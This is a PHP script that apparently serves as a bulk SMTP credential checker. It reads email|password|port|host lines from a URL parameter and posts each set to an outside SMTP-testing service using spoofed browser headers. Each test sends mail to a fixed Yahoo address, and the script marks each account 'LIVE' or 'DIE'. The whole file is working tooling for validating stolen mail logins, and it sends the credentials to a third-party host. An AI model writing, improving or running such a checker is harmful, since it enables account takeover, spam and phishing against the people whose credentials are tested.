<?php
session_start();
error_reporting(0);
$xx = "|";
if(isset($_GET['user']) && $xx)
{
    separar(trim($_GET['user']), $xx);
}
function separar($user, $xx){
$ab = split("\n", $user);
$cb = count($ab);
for($x = 0; $x < $cb; $x++){
    list($email, $pass, $port, $host) = split("\\".$xx, $ab[$x]);
    testar($email, $pass, $port, $host);
    flush();
    ob_flush();
}
}
function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}
function testar($email, $pass, $port, $host){
     $url = "http://www.smtper.net/api/smtper/";
     $post  = '{"host":"'.$host.'","port":"'.$port.'","enableSsl":true,"useCredentials":true,"userName":"'.$email.'","password":"'.$pass.'","mailFrom":"'.$email.'","mailTo":"cekstill@yahoo.com"}';

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_REFERER, $url);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36');
            $request_headers = array();
            $request_headers[] = 'Cookie: _ga=GA1.2.1220083620.1534357580; _gid=GA1.2.95987613.1534357580';
            $request_headers[] = 'Origin: https://www.smtper.net';
            $request_headers[] = 'Accept-Encoding: gzip, deflate';
            $request_headers[] = 'Accept-Language: en-US,en;q=0.8';
            $request_headers[] = 'Content-Type: application/json; charset=UTF-8';
            $request_headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
            $request_headers[] = 'Referer: https://www.smtper.net/';
            $request_headers[] = 'X-Requested-With: XMLHttpRequest';
            $request_headers[] = 'User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36';
            curl_setopt($curl, CURLOPT_HTTPHEADER, $request_headers);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_COOKIESESSION, 1);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_VERBOSE, 1);
    if ($post !== '') {
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
    }
    $result = curl_exec($curl);
    curl_close($curl);
    $xx = json_decode($result);
    #echo $result;
    if(strpos($result, "OK") !== false){
    $array = array(
    'status' => "LIVE",
    'email' => $email,
    'passw' => $pass,
    'message1' => $result);
    exit(json_encode($array));
    }else{
    $array = array(
    'status' => "DIE",
    'email' => $email,
    'passw' => $pass,
    'message' => $result);
    exit(json_encode($array));
    }
}
?>